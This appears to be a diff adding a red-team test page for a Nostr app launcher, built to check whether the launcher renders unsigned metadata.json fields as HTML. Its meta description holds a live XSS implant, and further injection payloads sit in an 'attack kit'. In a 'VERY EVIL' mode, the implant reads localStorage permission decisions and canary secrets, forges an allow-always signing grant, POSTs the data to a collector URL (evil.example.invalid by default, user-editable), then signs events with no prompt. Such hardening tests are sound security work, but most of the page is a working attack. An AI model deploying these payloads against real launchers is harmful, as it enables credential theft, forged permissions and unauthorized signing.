@@ -1,0 +1,747 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>evil-02 launcher xss</title>
+<meta name="description" content="Red team: unsigned metadata.json rendered as HTML in the launcher origin. The description and icon below carry real injection payloads; a launcher that interpolates them into its DOM executes them at its own origin.&lt;img src=x onerror=&quot;(function(v){var s=function(m){var f=document.querySelectorAll('iframe'),i;for(i=0;i&lt;f.length;i++){try{f[i].contentWindow.postMessage({__evil02xss:{vector:v,msg:m}},'*')}catch(e){}}};s('fired');var n=0,t=setInterval(function(){s('fired');if(++n>19)clearInterval(t)},500);var w=window;if(w.__evil02i)return;w.__evil02i=1;w.addEventListener('message',function(e){var d=e.data&amp;&amp;e.data.__evil02arm;if(!d)return;try{var o={};o.decisions=localStorage.getItem('__harness_decisions__');o.canary=localStorage.getItem('__harness_canary_nsec__');o.grant=localStorage.getItem('__harness_canary_grant__');var a=JSON.parse(localStorage.getItem('__harness_decisions__')||'{}');a['evil-02-launcher-xss|signEvent']='allow';localStorage.setItem('__harness_decisions__',JSON.stringify(a));o.forged=true;fetch(d.collector,{method:'POST',mode:'no-cors',body:JSON.stringify({kind:'launcher-xss-grant-theft',data:o})});s('done:'+JSON.stringify(o).slice(0,300))}catch(x){s('err:'+x)}})})('description')&quot;>">
+<meta name="napp-id" content="evil-02-launcher-xss">
+<!--
+  evil-napps ROE (see repo README):
+  - demo mode: probe + masked evidence only. no writes outside this frame
+    (one immediately-cleaned marker key on the napp's OWN origin proves
+    the origin grant, nothing more), no network, no signing, no dispatch,
+    no store mutation, no persistence, no destruction.
+  - ONE navigation exception: the ancestor-navigation probe can only detect
+    permission by navigating, so it reloads the launcher at its OWN current
+    URL with a marker hash — reversible, nothing leaves the launcher's URL.
+  - VERY EVIL mode: in-napp arming + stern confirmation that describes
+    every armed payload exactly + typed EXECUTE EVIL, then real execution,
+    destructive payloads last.
+  - default collector is https://evil.example.invalid/collect (RFC 2606,
+    non-resolving): even in VERY EVIL mode nothing leaves the machine.
+-->
+<style>
+  :root {
+    --bg: #120f16;
+    --fg: #e9e6f2;
+    --primary: #ff5470;
+    --ok: #3fd68f;
+    --warn: #ffb454;
+    --muted: #8d88a3;
+    --danger: #ff5470;
+    --surface: color-mix(in srgb, var(--bg) 88%, var(--fg));
+    --border: color-mix(in srgb, var(--fg) 16%, transparent);
+    --space-1: 4px;
+    --space-2: 8px;
+    --space-3: 12px;
+    --control-h: 28px;
+    --radius: 6px;
+    color-scheme: dark;
+    font: 12.5px/1.45 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+  }
+  html, body { height: 100%; margin: 0; }
+  #app {
+    container-type: inline-size;
+    height: 100%;
+    box-sizing: border-box;
+    display: flex;
+    flex-direction: column;
+    gap: var(--space-2);
+    padding: var(--space-2);
+    background: var(--bg);
+    color: var(--fg);
+    user-select: none;
+  }
+  .toolbar {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: var(--space-1);
+    min-height: var(--control-h);
+    flex: 0 0 auto;
+  }
+  .summary {
+    color: var(--muted);
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+  .summary b { color: var(--danger); }
+  .summary .ok-count { color: var(--ok); }
+  .summary .sent-count { color: var(--warn); }
+  .spacer { flex: 1; }
+  button {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    color: var(--fg);
+    cursor: pointer;
+    font: inherit;
+    height: var(--control-h);
+    padding: 0 10px;
+    white-space: nowrap;
+  }
+  button:hover:not(:disabled) { border-color: var(--primary); color: var(--primary); }
+  button:disabled { opacity: .45; cursor: default; }
+  button.arm { border-color: color-mix(in srgb, var(--danger) 60%, var(--border)); color: var(--danger); font-weight: 700; }
+  #rows {
+    flex: 1 1 auto;
+    min-height: 0;
+    overflow: auto;
+    display: grid;
+    grid-auto-rows: min-content;
+    gap: var(--space-1);
+    align-content: start;
+  }
+  @container (min-width: 760px) { #rows { grid-template-columns: 1fr 1fr; } }
+  @container (min-width: 1200px) { #rows { grid-template-columns: 1fr 1fr 1fr; } }
+  .attack {
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: var(--space-2);
+    display: grid;
+    gap: var(--space-1);
+    background: color-mix(in srgb, var(--surface) 30%, transparent);
+  }
+  .attack.armed, .attack.sent { border-color: color-mix(in srgb, var(--danger) 55%, var(--border)); }
+  .attack-head { display: flex; align-items: center; gap: var(--space-2); flex-wrap: wrap; }
+  .attack-name { font-weight: 700; }
+  .attack-target { color: var(--muted); font-size: 11px; }
+  .chip {
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+    padding: 1px 6px;
+    font-size: 10px;
+    text-transform: uppercase;
+    letter-spacing: .04em;
+    white-space: nowrap;
+  }
+  .chip.status-armed { color: var(--danger); border-color: color-mix(in srgb, var(--danger) 55%, var(--border)); background: color-mix(in srgb, var(--danger) 12%, transparent); }
+  .chip.status-blocked { color: var(--ok); border-color: color-mix(in srgb, var(--ok) 45%, var(--border)); background: color-mix(in srgb, var(--ok) 10%, transparent); }
+  .chip.status-sent { color: var(--warn); border-color: color-mix(in srgb, var(--warn) 55%, var(--border)); background: color-mix(in srgb, var(--warn) 12%, transparent); }
+  .chip.status-na { color: var(--muted); }
+  .chip.sev-critical { color: var(--danger); }
+  .chip.sev-high { color: var(--warn); }
+  .chip.sev-info { color: var(--muted); }
+  .evidence {
+    color: var(--muted);
+    font-size: 11px;
+    user-select: text;
+    overflow-wrap: anywhere;
+  }
+  .row-actions { display: flex; gap: var(--space-1); }
+  .row-actions button { height: 22px; padding: 0 8px; font-size: 11px; }
+  #evilPanel {
+    border: 1px solid color-mix(in srgb, var(--danger) 55%, var(--border));
+    border-radius: var(--radius);
+    background: color-mix(in srgb, var(--danger) 8%, var(--surface));
+    padding: var(--space-2);
+    display: grid;
+    gap: var(--space-1);
+    max-height: 40%;
+    overflow: auto;
+    flex: 0 0 auto;
+  }
+  #evilPanel h2 { margin: 0; font-size: 11px; text-transform: uppercase; letter-spacing: .06em; color: var(--danger); }
+  .evil-log { font-size: 11px; white-space: pre-wrap; user-select: text; color: var(--fg); }
+  #reportBox { display: grid; gap: var(--space-1); flex: 0 0 auto; }
+  details#report, details#kit { border: 1px solid var(--border); border-radius: var(--radius); padding: var(--space-2); }
+  details#report summary, details#kit summary { cursor: pointer; color: var(--muted); }
+  #reportText {
+    box-sizing: border-box;
+    width: 100%;
+    min-height: 90px;
+    resize: vertical;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    color: var(--fg);
+    font: 11px/1.4 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    padding: var(--space-1);
+    user-select: text;
+  }
+  .kit-entry { margin-bottom: var(--space-2); }
+  .kit-entry .kit-label { color: var(--warn); font-size: 11px; }
+  .kit-entry .kit-note { color: var(--muted); font-size: 11px; margin: 2px 0; }
+  .kit-entry pre {
+    margin: 0;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: var(--space-1);
+    overflow: auto;
+    font: 10.5px/1.4 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    user-select: text;
+    max-height: 140px;
+  }
+  dialog {
+    background: var(--bg);
+    color: var(--fg);
+    border: 1px solid color-mix(in srgb, var(--danger) 55%, var(--border));
+    border-radius: 8px;
+    padding: var(--space-3);
+    max-width: min(640px, 92vw);
+    max-height: 86dvh;
+    overflow: auto;
+  }
+  dialog::backdrop { background: rgba(10, 6, 12, .8); }
+  dialog h2 { margin: 0 0 var(--space-2); color: var(--danger); font-size: 14px; text-transform: uppercase; letter-spacing: .08em; }
+  .stern { border: 1px solid var(--danger); border-radius: var(--radius); padding: var(--space-2); color: var(--danger); font-weight: 700; margin: 0 0 var(--space-2); }
+  .plan-list { margin: 0 0 var(--space-2); padding-left: 18px; }
+  .plan-list li { margin-bottom: var(--space-2); }
+  .plan-list b { color: var(--danger); }
+  label { display: block; color: var(--muted); font-size: 11px; margin-bottom: var(--space-1); }
+  input[type="text"], input[type="url"] {
+    box-sizing: border-box;
+    width: 100%;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    color: var(--fg);
+    font: inherit;
+    padding: 4px 8px;
+  }
+  dialog .confirm-row { display: flex; gap: var(--space-1); align-items: center; margin-top: var(--space-2); flex-wrap: wrap; }
+  #confirmBtn { border-color: var(--danger); color: var(--danger); font-weight: 700; }
+  #confirmBtn:not(:disabled):hover { background: var(--danger); color: var(--bg); }
+  .muted { color: var(--muted); font-size: 11px; }
+  @media (max-height: 240px) { .toolbar button .btn-label-long { display: none; } #reportBox { display: none; } }
+  @container (max-width: 300px) { .attack-target { display: none; } }
+  #hijack {
+    display: none;
+    background: var(--danger);
+    color: #14060a;
+    font-weight: 700;
+    text-align: center;
+    padding: var(--space-2);
+    flex: 0 0 auto;
+  }
+  #hijack a { color: inherit; }
+</style>
+</head>
+<body>
+<div id="app">
+  <div id="hijack">⚠ THIS PAGE JUST NAVIGATED THE LAUNCHER (window.top) AWAY — you are looking at the evil napp, not the launcher. <a href="about:blank" onclick="history.length > 1 ? history.back() : null; return false">go back</a> if you can.</div>
+  <div class="toolbar">
+    <span id="summary" class="summary">probing…</span>
+    <span class="spacer"></span>
+    <button id="runAllBtn" type="button">run all</button>
+    <button id="reportBtn" type="button">report</button>
+    <button id="armBtn" class="arm" type="button">ARM VERY EVIL MODE</button>
+  </div>
+  <div id="rows"></div>
+  <div id="evilPanel" hidden>
+    <h2>VERY EVIL MODE — execution log</h2>
+    <div id="evilLog" class="evil-log"></div>
+  </div>
+  <div id="reportBox">
+    <details id="report">
+      <summary>report (JSON)</summary>
+      <textarea id="reportText" rows="6" spellcheck="false"></textarea>
+      <div class="row-actions" style="margin-top: 6px;">
+        <button id="copyReportBtn" type="button">copy report</button>
+      </div>
+    </details>
+  </div>
+</div>
+
+<dialog id="confirmDlg" aria-labelledby="confirmTitle">
+  <form method="dialog" style="display:grid; gap: 0;">
+    <h2 id="confirmTitle">⚠ VERY EVIL MODE — final confirmation</h2>
+    <p class="stern">THIS WILL ACTUALLY EXECUTE THE ATTACKS. NOT A DRILL.</p>
+    <p class="muted">Every armed attack below will run for real, in this order (destructive payloads last). Where payloads egress, data leaves this frame toward the collector URL. Only a hardened launcher will stop them.</p>
+    <ol id="planList" class="plan-list"></ol>
+    <label>collector / exfiltration destination (edit to point at your own)
+      <input id="collectorInput" type="url" spellcheck="false">
+    </label>
+    <label>type <b style="color: var(--danger);">EXECUTE EVIL</b> exactly, case-sensitive, to enable the button
+      <input id="confirmInput" type="text" autocomplete="off" spellcheck="false" placeholder="EXECUTE EVIL">
+    </label>
+    <div class="confirm-row">
+      <button id="confirmBtn" type="button" disabled>EXECUTE — DO EVIL</button>
+      <button value="cancel" type="submit" style="align-self: center;">cancel — stay demo</button>
+    </div>
+  </form>
+</dialog>
+
+<script>
+'use strict';
+(function () {
+  window.__EVIL_ID__ = 'evil-02-launcher-xss';
+  const DEFAULT_COLLECTOR = 'https://evil.example.invalid/collect';
+  const CONFIRM_PHRASE = 'EXECUTE EVIL';
+  const state = {
+    results: {},     // id -> { status, evidence }
+    evilResults: {}, // id -> object evidence of the real execution
+    veryEvil: false,
+    collector: DEFAULT_COLLECTOR,
+  };
+
+  const app = document.getElementById('app');
+  const rowsEl = document.getElementById('rows');
+  const summaryEl = document.getElementById('summary');
+  const evilPanel = document.getElementById('evilPanel');
+  const evilLog = document.getElementById('evilLog');
+  const armBtn = document.getElementById('armBtn');
+  const confirmDlg = document.getElementById('confirmDlg');
+  const confirmInput = document.getElementById('confirmInput');
+  const confirmBtn = document.getElementById('confirmBtn');
+  const collectorInput = document.getElementById('collectorInput');
+  const planList = document.getElementById('planList');
+  const reportText = document.getElementById('reportText');
+
+  // If this page ever IS the top-level browsing context, the launcher was
+  // hijacked to it — show the banner (see the hijack row in evil-01).
+  if (window.top === window) document.getElementById('hijack').style.display = 'block';
+
+  /* ---------- shared helpers ---------- */
+
+  function errMsg(e) {
+    if (!e) return String(e);
+    if (typeof e === 'string') return e;
+    return (e.name ? e.name + ': ' : '') + (e.message || String(e));
+  }
+  function mask(v, keep) {
+    keep = keep || 6;
+    const s = String(v);
+    if (s.length <= keep) return s.slice(0, 1) + '…';
+    return s.slice(0, keep) + '… (' + s.length + ' chars, masked)';
+  }
+  function randId() {
+    try { return crypto.randomUUID().slice(0, 8); }
+    catch (_) { return Math.random().toString(16).slice(2, 10); }
+  }
+  function randHex(n) {
+    const b = new Uint8Array(n / 2);
+    crypto.getRandomValues(b);
+    return Array.from(b).map(x => x.toString(16).padStart(2, '0')).join('');
+  }
+  function withTimeout(promise, ms) {
+    ms = ms || 2000;
+    return new Promise((resolve) => {
+      const t = setTimeout(() => resolve('timeout'), ms);
+      Promise.resolve(promise).then(
+        (v) => { clearTimeout(t); resolve(v); },
+        (e) => { clearTimeout(t); resolve({ __rejected: errMsg(e) }); }
+      );
+    });
+  }
+  function blocked(evidence) { return { status: 'blocked', evidence: evidence }; }
+  function armed(evidence) { return { status: 'armed', evidence: evidence }; }
+  function na(evidence) { return { status: 'na', evidence: evidence }; }
+  function sent(evidence) { return { status: 'sent', evidence: evidence }; }
+  function safeGet(fn) {
+    try { return fn(); } catch (e) { return 'denied: ' + errMsg(e); }
+  }
+  function findNostr() {
+    if (window.nostr) return window.nostr;
+    try { if (window.parent && window.parent.nostr) return window.parent.nostr; } catch (_) { /* cross-origin: held */ }
+    return null;
+  }
+  // NAPP context: instance id (window.name), the granted bridge surface,
+  // origin/position — captured once for every probe and the report.
+  function bridgePresence() {
+    return {
+      instance: safeGet(() => window.name) || null,
+      nostr: !!findNostr(),
+      nostrdb: typeof window.nostrdb === 'object',
+      napp: typeof window.napp === 'object',
+    };
+  }
+  function captureSummary() {
+    return JSON.stringify({
+      origin: safeGet(() => window.origin),
+      href: safeGet(() => location.href),
+      referrer: document.referrer,
+      instance: safeGet(() => window.name),
+      parentLength: safeGet(() => window.parent.length),
+      bridge: bridgePresence(),
+      at: new Date().toISOString(),
+    });
+  }
+  async function sendToCollector(kind, data) {
+    const url = state.collector;
+    const body = JSON.stringify({ kind: kind, at: new Date().toISOString(), data: data });
+    try {
+      const r = await withTimeout(fetch(url, { method: 'POST', mode: 'no-cors', body: body }), 4000);
+      if (r === 'timeout') return 'fetch timed out';
+      if (r && r.__rejected) return 'network egress failed: ' + r.__rejected;
+      return 'request dispatched to collector (opaque response) — egress channel OPEN';
+    } catch (e) {
+      return 'network egress failed: ' + errMsg(e) + ' — launcher/CSP held';
+    }
+  }
+  function postParent(msg) { window.parent.postMessage(msg, '*'); }
+  function postTop(msg) { window.top.postMessage(msg, '*'); }
+  function waitForMsg(id, ms) {
+    ms = ms || 2000;
+    return new Promise((resolve) => {
+      const on = (e) => {
+        if (e.data && e.data.id === id) {
+          cleanup(); resolve(e.data);
+        }
+      };
+      function cleanup() { window.removeEventListener('message', on); }
+      window.addEventListener('message', on);
+      setTimeout(() => { cleanup(); resolve('timeout'); }, ms);
+    });
+  }
+  // A bridge rpc with the napp dialect this suite speaks (mirrors the
+  // reference bridge.js): a postMessage envelope tagged __nostrapps:"rpc".
+  function bridgeRpc(method, params) {
+    const id = 'evil-rpc-' + randId();
+    const p = waitForMsg(id, 4000);
+    postParent({
+      __nostrapps: 'rpc', id: id, method: method,
+      params: params, instanceId: window.name,
+    });
+    return p;
+  }
+  // sessionStorage flag that survives a launcher reload at this origin —
+  // used by probes that must navigate to detect (see top-nav row).
+  const NAV_FLAG = '__evil01_navprobe__';
+  function navProbeFlag() { try { return sessionStorage.getItem(NAV_FLAG); } catch (_) { return null; } }
+  function setNavProbeFlag() { try { sessionStorage.setItem(NAV_FLAG, new Date().toISOString()); } catch (_) {} }
+  function clearNavProbeFlag() { try { sessionStorage.removeItem(NAV_FLAG); } catch (_) {} }
+
+  // evil-02 — launcher XSS (tier 0). NAPP.md §Local metadata: metadata.json is
+// the napp's self-description — local and uploaded napps both ship it, and it
+// is UNSIGNED, attacker-controlled bytes that the launcher interpolates into
+// its own origin's DOM (app cards, permission prompts, handler pickers,
+// window titles). A launcher that renders any field as HTML hands the napp
+// script execution at the launcher origin: the whole trust model inverts —
+// permission grants, the shared store, every bridge authority.
+//
+// The payloads live IN this napp's metadata.json (description = element
+// injection, icon = attribute injection). Each is an inert callback implant:
+// it reports 'fired' to every iframe and parks a message listener. In demo
+// mode that is ALL it does (no writes, no network). In VERY EVIL mode the
+// rows arm the parked implant: it steals the permission-decision store and the
+// harness canaries, FORGES an allow-always decision for this napp's
+// signEvent, exfiltrates, and the silent-sign row proves the forgery governs.
+window.__EVIL_KIT__ = [
+  {
+    label: 'metadata.json description — element injection',
+    note: 'NAPP.md never promises metadata fields are safe HTML. The launcher\'s card list, permission prompt and handler picker all put title/description into the launcher DOM. innerHTML there = script execution at the launcher origin.',
+    data: { title: 'Note editor', description: 'Note editor with tags and search.<img src=x onerror="/* implant */">' },
+  },
+  {
+    label: 'metadata.json icon — attribute injection',
+    note: 'icon is "Icon URL or path" — interpolated into an <img src="…"> by lazy launchers. Breaking out of the attribute executes the same implant without any element injection.',
+    data: { icon: 'x" onerror="/* implant */" data-y="' },
+  },
+  {
+    label: 'the forged decision the implant writes',
+    note: 'What launcher-origin XSS buys: the permission store is the launcher\'s own localStorage. An allow-always for signEvent turns every later gated call into silent signing — no prompt ever again.',
+    data: { '__harness_decisions__': { 'evil-02-launcher-xss|signEvent': 'allow' } },
+  },
+];
+
+// Every 'fired'/'done:'/'err:' callback the implant sends lands here.
+const xssEvents = [];
+window.addEventListener('message', (e) => {
+  const d = e.data && e.data.__evil02xss;
+  if (!d || typeof d.vector !== 'string') return;
+  xssEvents.push({ vector: d.vector, msg: String(d.msg || ''), at: Date.now() });
+});
+function firesFor(vector) { return xssEvents.some(x => x.vector === vector); }
+function implantReplies() { return xssEvents.filter(x => /^done:|^err:/.test(x.msg)); }
+function waitForXss(pred, ms) {
+  return new Promise((resolve) => {
+    const t0 = Date.now();
+    const iv = setInterval(() => {
+      if (pred()) { clearInterval(iv); resolve(true); }
+      else if (Date.now() - t0 > ms) { clearInterval(iv); resolve(false); }
+    }, 150);
+  });
+}
+function waitForImplantReply(ms) {
+  return waitForXss(() => implantReplies().length > 0, ms)
+    .then((ok) => (ok ? implantReplies()[implantReplies().length - 1] : null));
+}
+
+const ATTACKS = [
+  {
+    id: 'card-html',
+    name: 'metadata rendered as HTML',
+    target: 'NAPP.md §Local metadata — unsigned metadata.json interpolated into the launcher\'s own DOM',
+    severity: 'critical',
+    harm: 'metadata.json is attacker bytes. Rendered as HTML in the launcher origin it executes script THERE: read and forge permission grants, drive the shared store, script every napp frame, deface the launcher. The bridge\'s whole permission model becomes decoration.',
+    evilBrief: 'Arms the callback implant already parked at the launcher origin: it reads the permission-decision store and the launcher canaries, FORGES an allow-always signEvent decision for this napp, POSTs everything to the collector, and reports back. (In demo mode the implant is inert: it only called back to prove execution.)',
+    async demo() {
+      const fired = await waitForXss(() => firesFor('description'), 3500);
+      if (fired) {
+        return armed(
+          'payload EXECUTED at the launcher origin — my metadata.json description ran as script there and called back to me. ' +
+          'The implant is parked (inert in demo mode); on EXECUTE it takes the permission store.'
+        );
+      }
+      return blocked(
+        'no callback: the launcher rendered metadata as text, or its CSP held inline handlers — the description payload never executed'
+      );
+    },
+    async evil() {
+      postParent({ __evil02arm: { collector: state.collector } });
+      const reply = await waitForImplantReply(9000);
+      if (!reply) return { error: 'implant never answered the arm message (not parked?)' };
+      return { implantReply: reply.msg.slice(0, 320), vector: reply.vector };
+    },
+  },
+  {
+    id: 'icon-attr',
+    name: 'icon attribute injection',
+    target: 'metadata.json icon: "Icon URL or path" — interpolated into <img src="…">',
+    severity: 'high',
+    harm: 'Even a launcher that escapes description strings often builds icon tags by string concatenation. Breaking out of the src attribute executes the same implant — the icon field needs the same treatment as every other metadata field.',
+    evilBrief: 'Same as the description row: the icon-vector implant reports and, armed, steals + forges + exfiltrates from the launcher origin.',
+    async demo() {
+      const fired = await waitForXss(() => firesFor('icon'), 3500);
+      if (fired) {
+        return armed('icon attribute injection EXECUTED at the launcher origin (vector: icon) — the payload broke out of the src attribute and called back');
+      }
+      return blocked('no callback from the icon vector — rendered safely or held');
+    },
+    async evil() {
+      postParent({ __evil02arm: { collector: state.collector } });
+      const reply = await waitForImplantReply(9000);
+      return { implantReply: reply ? reply.msg.slice(0, 320) : 'no reply (already armed by the first row — see its evidence)' };
+    },
+  },
+  {
+    id: 'silent-sign',
+    name: 'forged grant → silent signing',
+    target: 'the permission store is launcher-origin localStorage',
+    severity: 'critical',
+    harm: 'Launcher-origin XSS is not just reading: the permission-decision store is writable. One forged allow-always and every later gated bridge call — signing, publishing — runs with no prompt, forever. The user never sees another dialog.',
+    evilBrief: 'After the implant forges the allow-always signEvent decision, this row calls window.nostr.signEvent through the bridge and signs a marker note with NO prompt. The launcher\'s prompt knob is still on "prompt" — the forged grant governs anyway.',
+    async demo() {
+      if (firesFor('description') || firesFor('icon')) {
+        return armed(
+          'the implant is parked at the launcher origin (see the render rows) — on EXECUTE it forges an allow-always for my signEvent, and this row signs with NO prompt, under the "prompt" policy'
+        );
+      }
+      return blocked('no implant parked at the launcher — nothing to forge grants with');
+    },
+    async evil() {
+      const r = await bridgeRpc('signEvent', {
+        kind: 1,
+        tags: [['alt', 'evil-02 forged-grant silent signing proof'], ['client', 'evil-napps']],
+        content: 'evil-02: signed under a FORGED allow-always decision — no prompt was shown',
+        created_at: Math.floor(Date.now() / 1000),
+      });
+      const res = r && typeof r === 'object' ? (r.result ?? r.error ?? r) : r;
+      const sig = res && typeof res === 'object' ? res.sig : null;
+      return {
+        signResult: res && typeof res === 'object' ? { id: res.id, sig: sig ? mask(sig, 12) : sig } : res,
+        promptFree: typeof sig === 'string' && sig.length > 0,
+      };
+    },
+  },
+];
+
+
+  /* ---------- rendering ---------- */
+
+  function sevChip(sev) {
+    const s = sev === 'critical' ? 'sev-critical' : sev === 'high' ? 'sev-high' : 'sev-info';
+    return '<span class="chip ' + s + '">' + sev + '</span>';
+  }
+  function statusChip(st) {
+    const label = st === 'armed' ? 'ARMED' : st === 'blocked' ? 'HELD' : st === 'sent' ? 'SENT' : st === 'na' ? 'N/A' : st || '—';
+    return '<span class="chip status-' + (st || 'na') + '">' + label + '</span>';
+  }
+  function esc(s) {
+    return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/"/g, '&quot;');
+  }
+  function renderRows() {
+    rowsEl.innerHTML = '';
+    for (const a of ATTACKS) {
+      const r = state.results[a.id] || {};
+      const div = document.createElement('div');
+      div.className = 'attack' + (r.status === 'armed' || r.status === 'sent' ? ' ' + r.status : '');
+      div.dataset.attack = a.id;
+      div.dataset.status = r.status || 'pending';
+      div.innerHTML =
+        '<div class="attack-head">' +
+          statusChip(r.status) +
+          '<span class="attack-name">' + esc(a.name) + '</span>' +
+          sevChip(a.severity) +
+          '<span class="spacer"></span>' +
+          '<div class="row-actions"><button data-probe="' + a.id + '" type="button">probe</button></div>' +
+        '</div>' +
+        '<div class="attack-target">' + esc(a.target) + '</div>' +
+        '<div class="evidence">' + esc(r.evidence || 'not probed') + '</div>';
+      rowsEl.appendChild(div);
+    }
+    rowsEl.querySelectorAll('button[data-probe]').forEach((b) => {
+      b.addEventListener('click', () => runDemo(b.dataset.probe));
+    });
+  }
+  function renderSummary() {
+    const counts = { armed: 0, blocked: 0, na: 0, sent: 0 };
+    for (const a of ATTACKS) {
+      const s = (state.results[a.id] || {}).status;
+      if (counts[s] != null) counts[s]++;
+    }
+    summaryEl.innerHTML = state.veryEvil
+      ? '<b>VERY EVIL MODE ACTIVE</b> · payloads executed'
+      : 'demo mode · <b>' + counts.armed + ' armed</b> / <span class="ok-count">' + counts.blocked + ' held</span> / <span class="sent-count">' + counts.sent + ' sent</span> / ' + counts.na + ' n/a';
+    const armable = counts.armed + counts.sent;
+    armBtn.disabled = armable === 0;
+    armBtn.title = armable === 0 ? 'nothing armed — launcher held every probe' : armable + ' attack(s) armable';
+  }
+  function renderKit() {
+    const kit = window.__EVIL_KIT__;
+    if (!kit || !kit.length) return;
+    const d = document.createElement('details');
+    d.id = 'kit';
+    d.innerHTML = '<summary>attack kit — crafted inputs (copy)</summary>';
+    for (const entry of kit) {
+      const div = document.createElement('div');
+      div.className = 'kit-entry';
+      div.innerHTML =
+        '<div class="kit-label">' + esc(entry.label) + '</div>' +
+        (entry.note ? '<div class="kit-note">' + esc(entry.note) + '</div>' : '') +
+        '<pre>' + esc(typeof entry.data === 'string' ? entry.data : JSON.stringify(entry.data, null, 2)) + '</pre>' +
+        '<div class="row-actions"><button type="button">copy</button></div>';
+      div.querySelector('button').addEventListener('click', () => {
+        const text = typeof entry.data === 'string' ? entry.data : JSON.stringify(entry.data, null, 2);
+        try { void navigator.clipboard.writeText(text); } catch (_) { /* clipboard denied */ }
+      });
+      d.appendChild(div);
+    }
+    document.getElementById('reportBox').before(d);
+  }
+  function render() { renderRows(); renderSummary(); }
+
+  async function runDemo(id) {
+    const a = ATTACKS.find((x) => x.id === id);
+    if (!a) return;
+    state.results[id] = { status: 'pending', evidence: 'probing…' };
+    render();
+    try {
+      state.results[id] = await a.demo();
+    } catch (e) {
+      state.results[id] = { status: 'na', evidence: 'probe error: ' + errMsg(e) };
+    }
+    render();
+    updateReport();
+  }
+  async function runAllDemos() {
+    for (const a of ATTACKS) await runDemo(a.id);
+  }
+
+  /* ---------- VERY EVIL ---------- */
+
+  function planOrder() {
+    const plain = ATTACKS.filter((a) => a.evil && !a.destructive);
+    const last = ATTACKS.filter((a) => a.evil && a.destructive);
+    return plain.concat(last);
+  }
+  function openConfirm() {
+    const armable = planOrder().filter((a) => {
+      const s = (state.results[a.id] || {}).status;
+      return s === 'armed' || s === 'sent';
+    });
+    if (!armable.length) return;
+    planList.innerHTML = '';
+    for (const a of armable) {
+      const li = document.createElement('li');
+      li.innerHTML = '<b>' + esc(a.name) + '</b> — ' + esc(a.evilBrief || a.harm);
+      planList.appendChild(li);
+    }
+    collectorInput.value = state.collector;
+    confirmInput.value = '';
+    confirmBtn.disabled = true;
+    confirmDlg.showModal();
+  }
+  collectorInput.addEventListener('input', () => { state.collector = collectorInput.value.trim() || DEFAULT_COLLECTOR; });
+  confirmInput.addEventListener('input', () => { confirmBtn.disabled = confirmInput.value !== CONFIRM_PHRASE; });
+
+  confirmBtn.addEventListener('click', async () => {
+    confirmDlg.close();
+    await executeVeryEvil();
+  });
+
+  async function executeVeryEvil() {
+    state.veryEvil = true;
+    evilPanel.hidden = false;
+    evilLog.textContent = '';
+    const logLine = (s) => {
+      evilLog.textContent += '[' + new Date().toISOString() + '] ' + s + '\n';
+      evilLog.scrollTop = evilLog.scrollHeight;
+    };
+    logLine('VERY EVIL MODE — executing armed payloads against ' + safeGet(() => location.href));
+    logLine('collector: ' + state.collector);
+    renderSummary();
+    for (const a of planOrder()) {
+      const st = (state.results[a.id] || {}).status;
+      if (st !== 'armed' && st !== 'sent') {
+        state.evilResults[a.id] = { skipped: 'not armed (' + (st || 'unprobed') + ') — launcher holds' };
+        logLine('SKIP ' + a.name + ' — not armable, the launcher holds');
+        updateReport();
+        continue;
+      }
+      logLine('RUN  ' + a.name + ' — ' + (a.evilBrief || a.harm));
+      try {
+        state.evilResults[a.id] = await a.evil();
+        logLine('DONE ' + a.name + ' → ' + JSON.stringify(state.evilResults[a.id]).slice(0, 400));
+      } catch (e) {
+        state.evilResults[a.id] = { error: errMsg(e) };
+        logLine('ERR  ' + a.name + ' → ' + errMsg(e));
+      }
+      updateReport();
+      renderSummary();
+    }
+    logLine('finished. everything above actually happened.');
+    updateReport();
+  }
+
+  /* ---------- report ---------- */
+
+  function buildReport() {
+    return {
+      napp: window.__EVIL_ID__ || 'unknown',
+      mode: state.veryEvil ? 'VERY-EVIL' : 'demo',
+      at: new Date().toISOString(),
+      collector: state.collector,
+      location: safeGet(() => location.href),
+      origin: safeGet(() => window.origin),
+      referrer: document.referrer,
+      instance: safeGet(() => window.name),
+      bridge: bridgePresence(),
+      parentLength: safeGet(() => window.parent.length),
+      findings: ATTACKS.map((a) => Object.assign({ id: a.id, name: a.name, severity: a.severity }, state.results[a.id] || {}, { evil: state.evilResults[a.id] || null })),
+    };
+  }
+  function updateReport() {
+    reportText.value = JSON.stringify(buildReport(), null, 2);
+  }
+  document.getElementById('copyReportBtn').addEventListener('click', async () => {
+    try {
+      await navigator.clipboard.writeText(reportText.value);
+    } catch (_) {
+      reportText.select();
+    }
+  });
+  document.getElementById('reportBtn').addEventListener('click', () => {
+    const d = document.getElementById('report');
+    d.open = !d.open;
+  });
+
+  armBtn.addEventListener('click', () => { updateReport(); openConfirm(); });
+  document.getElementById('runAllBtn').addEventListener('click', () => { void runAllDemos(); });
+
+  /* ---------- boot ---------- */
+  renderKit();
+  render();
+  updateReport();
+  void runAllDemos();
+})();
+</script>
+</body>
+</html>
